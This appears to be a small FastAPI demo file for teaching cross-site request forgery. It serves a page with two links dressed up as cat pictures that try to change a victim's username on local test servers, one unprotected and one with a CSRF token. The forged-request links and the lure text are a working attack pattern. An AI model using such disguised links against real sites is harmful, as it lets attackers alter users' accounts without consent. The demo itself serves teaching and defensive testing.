from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse


app = FastAPI()


html = """
<h1>Unprotected server</h1>
<p>Malicious link: it will change your username on the vulnerable server</p>
<a href="http://127.0.0.1:8000/change-username-submit?old=victim&new=HACKED">
    Click here and see the pictures of your cats!
</a>
<h1>Protected server</h1>
<p>Malicious link: it will change your username on the vulnerable server</p>
<a href="http://127.0.0.1:9000/change-username-submit?old=victim&new=HACKED&token=HACKED">
    Click here and see the pictures of your cats!
</a>
"""


@app.get("/change-username")
async def change_username_unsecure_server(request: Request):
    return HTMLResponse(html)
